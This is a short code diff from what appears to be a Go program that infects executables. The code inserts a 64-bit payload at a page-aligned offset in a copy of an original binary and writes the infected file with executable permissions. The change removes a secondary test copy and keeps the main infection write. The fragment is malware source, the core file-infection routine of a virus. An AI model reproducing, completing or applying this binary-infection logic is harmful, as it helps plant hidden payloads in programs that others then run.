@@ -251,12 +251,9 @@ func main() {
 	copy(finalInfectionTwo[end_of_infection:], payload64)
 	copy(finalInfectionTwo[end_of_infection+PAGE_SIZE:], finalInfection[end_of_infection:])
 	infectedFileName := fmt.Sprintf("%s-copy", origFile)
-	infectedFileNameTwo := fmt.Sprintf("%s-copy-test", origFile)
 
 	err = ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751)
 	checkError(err)
-
-	ioutil.WriteFile(infectedFileNameTwo, finalInfection, 0751)
 	fmt.Println("finalInfectionTwo cap => ", cap(finalInfectionTwo), "finalInfectionTwo len => ", len(finalInfectionTwo))
 
 }
